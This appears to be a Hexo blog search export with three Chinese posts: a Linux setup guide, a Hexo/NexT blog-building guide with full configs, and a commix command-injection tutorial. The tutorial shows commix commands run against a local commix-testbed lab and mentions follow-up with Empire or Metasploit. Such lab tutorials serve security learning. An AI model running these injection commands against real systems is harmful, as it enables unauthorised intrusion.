–legacy –verbose #这里的disk0是安装grub的分区，可以通过diskutil list来进行查看 最后: 1reboot ok，这样单引导安装就完成了。 网易云音乐正确安装姿势下载网易云音乐（deepin版） 1dpkg –i 网易云.deb 注意!之后还要到/usr/share目录下的application目录找到网易云音乐，右键在命令后加一句： 1—no–sandbox 这样就ok了。 安装sun java 下载最新的JAVA JDK jdk-8u91-linux-x64 解压缩文件并移动至/opt 123tar -xzvf jdk-8u91-linux-x64.tar.gzmv jdk1.8.0_91 /optcd /opt/jdk1.8.0_91 设置环境变量 1）执行 gedit ~/.bashrc ， 并添加下列内容 1234# install JAVA JDKexport JAVA_HOME=/opt/jdk1.8.0_91export CLASSPATH=.:$&#123;JAVA_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 2）执行 source ~/.bashrc 安装并注册 执行： 1234update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1update-alternatives --set java /opt/jdk1.8.0_91/bin/javaupdate-alternatives --set javac /opt/jdk1.8.0_91/bin/javac 查看结果： 12update-alternatives --config javaupdate-alternatives --config javac 5. 测试12345java -version#output java version &quot;1.8.0_91&quot;Java(TM) SE Runtime Environment (build 1.8.0_91-b14)Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode) 解决sublime的中文输入问题 保存下述代码为 sublime-imfix.c 文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/*sublime-imfix.cUse LD_PRELOAD to interpose some function to fix sublime input method support for linux.By Cjacker Huanggcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPICLD_PRELOAD=./libsublime-imfix.so subl*/#include &lt;gtk/gtk.h&gt;#include &lt;gdk/gdkx.h&gt;typedef GdkSegment GdkRegionBox;struct _GdkRegion&#123; long size; long numRects; GdkRegionBox *rects; GdkRegionBox extents;&#125;;GtkIMContext *local_context;voidgdk_region_get_clipbox (const GdkRegion *region, GdkRectangle *rectangle)&#123; g_return_if_fail (region != NULL); g_return_if_fail (rectangle != NULL); rectangle-&gt;x = region-&gt;extents.x1; rectangle-&gt;y = region-&gt;extents.y1; rectangle-&gt;width = region-&gt;extents.x2 - region-&gt;extents.x1; rectangle-&gt;height = region-&gt;extents.y2 - region-&gt;extents.y1; GdkRectangle rect; rect.x = rectangle-&gt;x; rect.y = rectangle-&gt;y; rect.width = 0; rect.height = rectangle-&gt;height; //The caret width is 2; //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret. if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) &#123; gtk_im_context_set_cursor_location(local_context, rectangle); &#125;&#125;//this is needed, for example, if you input something in file dialog and return back the edit area//context will lost, so here we set it again.static GdkFilterReturn event_filter (GdkXEvent *xevent, GdkEvent *event, gpointer im_context)&#123; XEvent *xev = (XEvent *)xevent; if(xev-&gt;type == KeyRelease &amp;&amp; GTK_IS_IM_CONTEXT(im_context)) &#123; GdkWindow * win = g_object_get_data(G_OBJECT(im_context),&quot;window&quot;); if(GDK_IS_WINDOW(win)) gtk_im_context_set_client_window(im_context, win); &#125; return GDK_FILTER_CONTINUE;&#125;void gtk_im_context_set_client_window (GtkIMContext *context, GdkWindow *window)&#123; GtkIMContextClass *klass; g_return_if_fail (GTK_IS_IM_CONTEXT (context)); klass = GTK_IM_CONTEXT_GET_CLASS (context); if (klass-&gt;set_client_window) klass-&gt;set_client_window (context, window); if(!GDK_IS_WINDOW (window)) return; g_object_set_data(G_OBJECT(context),&quot;window&quot;,window); int width = gdk_window_get_width(window); int height = gdk_window_get_height(window); if(width != 0 &amp;&amp; height !=0) &#123; gtk_im_context_focus_in(context); local_context = context; &#125; gdk_window_add_filter (window, event_filter, context);&#125; 安装 C/C++ 的编译环境和 gtk libgtk2.0-dev 12sudo apt-get install build-essentialsudo apt-get install libgtk2.0-dev 编译共享内库 1gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC 设置 LD_PRELOAD 并启动 Sublime Text 1LD_PRELOAD=./libsublime-imfix.so subl 修改 /usr/share/applications/sublime_text.desktop 为 1234567891011121314[Desktop Entry][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text %F[...][Desktop Action Window][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text -n[...][Desktop Action Document][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text --command new_file[...] 不要忘了把 libsublime-imfix.so 放到 /opt/sublime_text/ 中 修改 /usr/bin/subl 为: 123#!/bin/shexport LD_PRELOAD=/opt/sublime_text/libsublime-imfix.soexec /opt/sublime_text/sublime_text “$@” 重启电脑，可以看到Sublime能够输入中文了。 没有声音???其实并不是不支持声卡驱动了。只是root用户下默认关闭。虽然在setting的sounds里没能看到识别的声卡信息。可是其实驱动是装好的。用pulseaudio –start，就有了。 输入以下一行，就不用每次启动都要输入那行代码了。 1systemctl –user enable pulseaudio]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hexo 3.x 博客搭建指南(NEXT主题)]]></title>
    <url>%2F2017%2F01%2F21%2FHexo-3-x-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97-NEXT%E4%B8%BB%E9%A2%98%2F</url>
    <content type="text"><![CDATA[GitHub Pages 本用于介绍托管在 GitHub 的项目，也可以用来搭建博客，有300M免费空间。 hexo是一个基于Node.js的静态博客程序，可以方便的生成静态网页托管在github和Heroku上。作者是来自台湾的tommy351。优势： 生成静态页面快支持 Markdown兼容于 Windows, Mac &amp; Linux部署方便。日常使用仅需五个命令。高扩展性、自订性，文件少、小，易理解 配置SSH使用hexo博客必须配置SSH。 打开git bash，输入cd ~/.ssh，如果果提示：No such file or directory 说明未配置SSH。 本地生成密钥对ssh-keygen -t rsa -C &quot;你的邮件地址&quot;，注意命令中的大小写不要搞混。按提示指定保存文件夹，不设置密码。 添加公钥到Github 根据上一步的提示，找到公钥文件（默认为id_rsa.pub），用记事本打开，全选并复制。 登录Github，右上角 头像 -&gt; Settings —&gt; SSH keys —&gt; Add SSH key。把公钥粘贴到key中，填好title并点击 Add key。 git bash中输入命令ssh -T git@github.com，选yes，等待片刻可看到成功提示。 修改本地的ssh remote url，不用https协议，改用git协议 Github仓库中获取ssh协议相应的url 本地仓库执行命令git remote set-url origin SSH对应的url，配置完后可用git remote -v查看结果 这样git push或hexo d时不再需要输入账号密码。 搭建博客注，以下命令行需要在Git终端中执行(右键单击 -&gt; Git bash)。 安装Git：下载安装后，注册Github账号并配置Git和SSH公私钥 安装Node.js 安装hexo：npm install -g hexo，可用hexo -v查看版本。这里我用的是3.1.1。也可以指定版本：npm install hexo@3.1.1 -g 创建hexo文件夹：新建放置博客的文件夹，进入并执行命令hexo init。hexo 会在目标文件夹建立网站所需要的所有文件。 安装依赖包：npm install 创建Github Repository：Repository名字必须是你的Github名.github.io，比如我是loveNight.github.io 部署：打开博客根目录下的_config.yml文件，末尾添加如下信息。 1234deploy: type: git repository: 上一步的Github仓库地址，项目主页点SSH再复制URL branch: master 然后执行命令： 12hexo generate # 生成静态页面，可以简化为hexo ghexo deploy # 部署到Github，可以简化为hexo d 浏览器访问loveNight.github.io就能看到自己的Blog了，一般延迟十分钟左右才能看到效果。一开始看到404页面不要惊慌，耐心等等。 手打党请注意，配置文件的冒号后必须有一个空格。 如果报错 1Deployer not found:git 运行命令 1npm install hexo-deployer-git --save hexo使用生成静态页面1hexo generate 本地启动1hexo server 浏览器输入localhost:4000就可以看到效果。当你修改了文章或配置文件时，保存文件再刷新浏览器就能看到修改后的效果，非常方便。 新建文章1hexo new post &quot;title&quot; # 生成新文章：\source\_posts\title.md，可省略post 新建页面1hexo new page &quot;title&quot; post、page等可以改成其他layout，可用layout在scaffolds目录下查看。在同目录下创建文件来添加自己的layout，也可以编辑现有的layout，比如post的layout默认是\scaffolds\post.md。 编辑文章打开新建的文章\source\_posts\postName.md： 12345678910title: HelloWorld！ # 文章页面上的显示名称，可以任意修改，不会出现在URL中date: 2015-11-09 15:56:26 # 文章生成时间，一般不改categories: # 文章分类目录，参数可省略 - 随笔 - 瞬间tags: # 文章标签，参数可省略 - hexo - blog # 个数不限，单个可直接跟在tags后面---这里开始使用markdown格式输入你的正文。 多级分类语法格式：（标签也可以用类似的写法） 12345678# 第一种categories: - 一级分类 - 二级分类 - etc...# 第二种：categories: [一级分类, 二级分类] 首页文章预览添加图片： 123photos: - http://xxx.com/photo1.jpg - http://xxx.com/photo2.jpg 正文中可以使用设置文章摘要 如下: 123以上显示在摘要中&lt;!--more--&gt;以下是余下全文 more 以上内容即是文章摘要，如果设置了主页只显示摘要，则more以下内容点击 Read More 链接打开全文才显示。 简单命令hexo现在支持更加简单的命令格式了，比如： 1234hexo g == hexo generate # 生成hexo d == hexo deploy # 部署 # 可与hexo g合并为 hexo d -ghexo s == hexo server # 本地预览hexo n == hexo new # 写文章 插入图片博客中的图片文件可以直接放在source文件夹下，部署时上传到Github仓库中。但是Github项目容量有限，而且主机在国外，访问速度较慢，把图片放在国内的图床上是个更好的选择。我用的是七牛云存储 免费用户实名审核之后，可以获取10GB永久免费存储空间、每月10GB下载流量、每月10万次Put请求、每月100万次Get请求，做图床绰绰有余。 注册账号，新建空间，我的新空间名是blog，专门用来放置博客上引用的资源。 进入空间后点击「内容管理」，再点击「上传」： 七牛空间没有文件夹的概念，但是允许为文件添加带斜杠/的前缀，用来给资源分类。这里我设置前缀为img/Hexo 3.1.1 静态博客搭建指南/。上传了一张图片,在右侧可以找到外链，复制地址： Markdown 插入图片的语法为： 1![](图片网址) 上传图片 -&gt; 获取外链 -&gt; 写入Markdown，就这么简单！ 由于七牛防盗链的白名单无法添加localhost，暂时不设置防盗链，否则hexo s调试的时候，看不到图片。 配置博客全站配置注意：文件中配置项的冒号后面必须加空格，否则报错 下面有些选项要配置后文的插件才有效，文件中已注明。 整站的配置：博客根目录下的\_config.yml文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# Hexo Configuration## Docs: http://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: ZEROYU # 站点名subtitle: # 副标题description: 一只单线程HACKERauthor: ZEROYU # 作者，在站点左下角可以看到#avatar: /images/avatar.jpg # 头像。Next主题增加的字段language: zh-Hans # 语言。Next主题增加的字段timezone: Asia/Shanghaisince: 2015 # 博客建立年份，Next主题增加的字段# 多说 ShortNameduoshuo_shortname: # xxx.duoshuo.com，xxx即是shortname。# Social linkssocial: Github: https://github.com/zer0yu Weibo: http://weibo.com/Z3r0yu Email: zeroyu.xyz@gmail.com # zhihu: http://www.zhihu.com/people/your-user-name# title, chinese availablelinks_title: 友情链接# linkslinks: 我的CSDN博客: http://blog.csdn.net/zeroyu_xyz# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: http://zer0yu.github.io/ # 网址root: /permalink: :year/:month/:day/:title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :lang # 国际化文件夹skip_render: # 跳过指定文件的渲染# Writing # 文章布局、写作格式的定义new_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0 # 1 为小写， 2 为大写render_drafts: false # 显示草稿post_asset_folder: false # 启动asset文件夹relative_link: false # 链接改为与根目录的相对地址future: true # 显示未来的文章highlight: enable: true line_number: true auto_detect: true tab_replace:# Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination # 每页显示文章数## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Extensions # 这里配置站点所用主题和插件## Plugins: http://hexo.io/plugins/plugins:baidusitemap: # 需要安装插件 npm install hexo-generator-baidu-sitemap@0.1.1 --save path: baidusitemap.xml# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/theme: nextfeed: type: atom #feed 类型 (atom/rss2) path: atom.xml #rss 路径 limit: 0 #在 rss 中最多生成的文章数(0显示所有)# 自定义站点内容搜索# 需要先安装插件：# npm install hexo-generator-search --savesearch: path: search.xml field: all # 如只想索引文章，可设置为post# Deployment # 站点部署到github## Docs: http://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:zer0yu/zer0yu.github.io.git branch: master# ---------------下面选项需要对应插件的支持---------------# npm install hexo-generator-index --save# npm install hexo-generator-archive --save# npm install hexo-generator-category --save# npm install hexo-generator-tag --saveindex_generator: per_page: 10 ##首页默认10篇文章标题 如果值为0不分页archive_generator: per_page: 20 ##归档页面默认20篇文章标题 yearly: true ##生成年视图 monthly: true ##生成月视图tag_generator: per_page: 10 ##标签分类页面默认10篇文章category_generator: per_page: 10 ###分类页面默认10篇文章 更换主题默认主题太丑，换成NexT主题。 安装：在博客根目录下执行git clone https://github.com/iissnan/hexo-theme-next.git themes/next。 启用：修改博客根目录下的_config.yml配置文件中的theme属性，将其设置为next。 更新：在themes/next目录下执行git pull。（暂时不需要） \themes\next\_config.yml修改主题配置。 我的_config.yml文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484# ---------------------------------------------------------------# Site Information Settings# ---------------------------------------------------------------# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico# Set default keywords (Use a comma to separate)keywords: "ZEROYU, SEC"# Set rss to false to disable feed link.# Leave rss as empty to use site's feed link.# Set rss to specific value if you have burned your feed already.rss:# Specify the date when the site was setup#since: 2015# icon between year and author @Footerauthoricon: heart# Footer `powered-by` and `theme-info` copyrightcopyright: true# Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.# See: https://support.google.com/webmasters/answer/139066# Tips: Before you open this tag, remeber set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )canonical: true# Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.seo: false# ---------------------------------------------------------------# Menu Settings# ---------------------------------------------------------------# When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)menu: home: / categories: /categories about: /about archives: /archives tags: /tags #sitemap: /sitemap.xml #commonweal: /404.html# Enable/Disable menu icons.# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of menu item and value is the name of FontAwsome icon. Key is case-senstive.# When an question mask icon presenting up means that the item has no mapping icon.menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: user categories: th schedule: calendar tags: tags archives: archive sitemap: sitemap commonweal: heartbeat# ---------------------------------------------------------------# Scheme Settings# ---------------------------------------------------------------# Schemes#scheme: Musescheme: Mist#scheme: Pisces# ---------------------------------------------------------------# Font Settings# - Find fonts on Google Fonts (https://www.google.com/fonts)# - All fonts set here will have the following styles:# light, light italic, normal, normal intalic, bold, bold italic# - Be aware that setting too much fonts will cause site running slowly# - Introduce in 5.0.1# ---------------------------------------------------------------font: enable: true # Uri of fonts host. E.g. //fonts.googleapis.com (Default) host: # Global font settings used on &lt;body&gt; element. global: # external: true will load this font family from host. external: true family: Lato # Font settings for Headlines (h1, h2, h3, h4, h5, h6) # Fallback to `global` font settings. headings: external: true family: # Font settings for posts # Fallback to `global` font settings. posts: external: true family: # Font settings for Logo # Fallback to `global` font settings. # The `size` option use `px` as unit logo: external: true family: size: # Font settings for &lt;code&gt; and code blocks. codes: external: true family: size:# ---------------------------------------------------------------# Sidebar Settings# ---------------------------------------------------------------# Social Links# Key is the link label showing to end users.# Value is the target link (E.g. GitHub: https://github.com/iissnan)#social: #LinkLabel: Link# Social Links Icons# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of the item and value is the name of FontAwsome icon. Key is case-senstive.# When an globe mask icon presenting up means that the item has no mapping icon.social_icons: enable: true # Icon Mappings. # KeyMapsToSocalItemKey: NameOfTheIconFromFontAwesome GitHub: github Twitter: twitter Weibo: weibo# Sidebar Avatar# in theme directory(source/images): /images/avatar.jpg# in site directory(source/uploads): /uploads/avatar.jpg#avatar:# Table Of Contents in the Sidebartoc: enable: true # Automatically add list number to toc. number: true# Creative Commons 4.0 International License.# http://creativecommons.org/# Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero#creative_commons: by-nc-sa#creative_commons:sidebar: # Sidebar Position, available value: left | right position: left #position: right # Sidebar Display, available value: # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggler. display: post #display: always #display: hide #display: remove# Blogrolls#links_title: Links#links_layout: block#links_layout: inline#links: #Title: http://example.com/# ---------------------------------------------------------------# Post Settings# ---------------------------------------------------------------# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.scroll_to_more: true# Automatically excerpt description in homepage as preamble text.excerpt_description: true# Automatically Excerpt. Not recommand.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: false length: 150# Post meta display settingspost_meta: item_text: true created_at: true updated_at: false categories: true# Wechat Subscriber#wechat_subscriber: #enabled: true #qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg #description: ex. subscribe to my blog by scanning my public wechat account# ---------------------------------------------------------------# Misc Theme Settings# ---------------------------------------------------------------# Custom Logo.# !!Only available for Default Scheme currently.# Options:# enabled: [true/false] - Replace with specific image# image: url-of-image - Images's urlcustom_logo: enabled: false image:# Code Highlight theme# Available value:# normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: normal# ---------------------------------------------------------------# Third Party Services Settings# ---------------------------------------------------------------# MathJax Supportmathjax: enable: false per_page: false cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML#local searchsearch: path: search.xml field: post format: html limit: 10000# Swiftype Search API Key#swiftype_key: oUgCiUNA9jix_1j3uXpn# Baidu Analytics IDbaidu_analytics: # Duoshuo ShortNameduoshuo_shortname: # Disqus#disqus_shortname:# Hypercomments#hypercomments_id:# Gentie productKey#gentie_productKey:# Support for youyan comments system.# You can get your uid from http://www.uyan.cc#youyan_uid: your uid# Baidu Share# Available value:# button | slide# Warning: Baidu Share does not support https.#baidushare:## type: button# Share#jiathis:# Warning: JiaThis does not support https.#add_this_id:# Share#duoshuo_share: true# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/#google_site_verification:# Google Analytics#google_analytics:# CNZZ count#cnzz_siteid:# Application Insights# See https://azure.microsoft.com/en-us/services/application-insights/# application_insights:# Make duoshuo show UA# user_id must NOT be null when admin_enable is true!# you can visit http://dev.duoshuo.com get duoshuo user id.duoshuo_info: ua_enable: true admin_enable: false user_id: 0 #admin_nickname: Author# Facebook SDK Support.# https://github.com/iissnan/hexo-theme-next/pull/410facebook_sdk: enable: false app_id: #&lt;app_id&gt; fb_admin: #&lt;user_id&gt; like_button: #true webmaster: #true# Facebook comments plugin# This plugin depends on Facebook SDK.# If facebook_sdk.enable is false, Facebook comments plugin is unavailable.facebook_comments_plugin: enable: false num_of_posts: 10 # min posts num is 1 width: 100% # default width is 550px scheme: light # default scheme is light (light or dark)# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: true app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt;# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: false # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;&lt;/i&gt; site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;&lt;/i&gt; site_pv_footer: # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; page_pv_footer:# Tencent analytics ID# tencent_analytics:# Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEObaidu_push: false# Google Calendar# Share your recent schedule to others via calendar page## API Documentation:# https://developers.google.com/google-apps/calendar/v3/reference/events/listcalendar: enable: false calendar_id: &lt;required&gt; api_key: &lt;required&gt; orderBy: startTime offsetMax: 24 offsetMin: 4 timeZone: showDeleted: false singleEvents: true maxResults: 250# Algolia Searchalgolia_search: enable: false hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: "We didn't find any results for the search: $&#123;query&#125;" hits_stats: "$&#123;hits&#125; results found in $&#123;time&#125; ms"#! ---------------------------------------------------------------#! DO NOT EDIT THE FOLLOWING SETTINGS#! UNLESS YOU KNOW WHAT YOU ARE DOING#! ---------------------------------------------------------------# Motionuse_motion: true# Fancyboxfancybox: true# Canvas-nestcanvas_nest: false# Script Vendors.# Set a CDN address for the vendor you want to customize.# For example# jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js# Be aware that you should use the same version as internal ones to avoid potential problems.# Please use the https protocol of CDN files when you enable https on your site.vendors: # Internal path prefix. Please do not edit it. _internal: lib # Internal version: 2.1.3 jquery: # Internal version: 2.1.5 # See: http://fancyapps.com/fancybox/ fancybox: fancybox_css: # Internal version: 1.0.6 # See: https://github.com/ftlabs/fastclick fastclick: # Internal version: 1.9.7 # See: https://github.com/tuupola/jquery_lazyload lazyload: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity_ui: # Internal version: 0.7.9 # See: https://faisalman.github.io/ua-parser-js/ ua_parser: # Internal version: 4.6.2 # See: http://fontawesome.io/ fontawesome: # Internal version: 1 # https://www.algolia.com algolia_instant_js: algolia_instant_css: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest:# Assetscss: cssjs: jsimages: images# Theme versionversion: 5.1.0 个性化设置按照NexT 使用文档设置一下，其中的内容下面不再赘述。 绑定个人域名1、在source文件夹中新建一个CNAME文件（无后缀名），然后用文本编辑器打开，在首行添加你的网站域名，如http://xxxx.com，注意前面没有http://，也没有www，然后使用hexo g &amp;&amp; hexo d上传部署。2、在域名解析提供商，下面以dnspod为例。（1）先添加一个CNAME，主机记录写@，后面记录值写上你的http://xxxx.github.io（2）再添加一个CNAME，主机记录写www，后面记录值也是http://xxxx.github.io这样别人用www和不用www都能访问你的网站（其实www的方式，会先解析成http://xxxx.github.io，然后根据CNAME再变成http://xxx.com，即中间是经过一次转换的）。上面，我们用的是CNAME别名记录，也有人使用A记录，后面的记录值是写github page里面的ip地址，但有时候IP地址会更改，导致最后解析不正确，所以还是推荐用CNAME别名记录要好些，不建议用IP。3、等十分钟左右，刷新浏览器，用你自己域名访问下试试(参考)]]></content>
  </entry>
  <entry>
    <title><![CDATA[commix-系统命令注入自动化测试实例]]></title>
    <url>%2F2017%2F01%2F21%2Fcommix-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[引言​ commix是一款很好用的命令注入的工具，前几天看了看国内对其的介绍和使用示例挺少的，所以最近有空就写了这一篇文章来列举几个使用的栗子。 概念​ 命令注入就是部分Web应用程序提供了一些命令执行的操作，那么在Web应用程序底层去调用系统操作命令时，如果没有过滤好用户输入的数据，就很有可能形成系统命令执行漏洞来直接执行操作系统命令。详细讲解参考Command Injection commix简介​ 此处就不详细介绍了如果想要了解可以看这两篇文章： ​ http://www.mottoin.com/91981.html ​ http://www.mottoin.com/91806.html 测试环境搭建​ 在这里你可以使用DVWA或者DWAPP来实战，当然我觉得要尽可能全的包含各种类型的命令注入漏洞才算完美所以我们在此处使用commix提供的一个测试平台commix-testbed。 1.如果你在使用windows平台那么我推荐PHPStudy来搭建环境 安装完成后你只需要在phpstudy的www目录下打开cmd键入： git clone https://github.com/commixproject/commix-testbed.git (当然你要确保你安装了Git) 之后只要启动phpstudy就可以在浏览器中访问了 2.如果你使用的是Linux或者MacOS平台我推荐用xampp来搭建环境 搭建好之后你就可以看到如下界面 环境搭建好后我们来进行渗透测试 示例一：Results-based命令注入攻击我们选择GET方式的Classic regular example ping下127.0.0.1试下 复制url并打开commix开始hack 渗透主机为win后期可以借助empire（不知道empire？？？没关系戳我） 可以使用 commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/classic.php?addr=127.0.0.1&quot; --hostname --current-user --sys-info 含义：显示当前测试主机的主机名，用户名和系统信息 如果渗透主机为Linux则后期可以借助msf(不会msf？？？没关系戳我) 示例二：User-Agent HTTP头注入攻击选择User-Agent HTTP Header中的第一个Classic user-agent-based example http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot; 含义：post参数addr=192.168.1.121并指定要使用的进样技术 效果如下： 示例三：Referer HTTP头注入攻击选择Referer HTTP Header中的第一个Classic referer-based example http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot; 和上面的差不多不解释了 效果如下： 示例四：Blind 命令注入攻击选择Regular (GET / POST)中的Blind regular example http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1&quot; --technique=&quot;tf&quot; -v 1 效果如下： 执行命令： 彩蛋上面的例子不是很全，有几个使用commix进行命令注入的视频，有兴趣可以下载看下 链接: https://pan.baidu.com/s/1qXMNjZm 密码: 5peb 参考https://github.com/commixproject/commix-testbed https://github.com/commixproject/commix http://www.commixproject.com/]]></content>
  </entry>
</search>
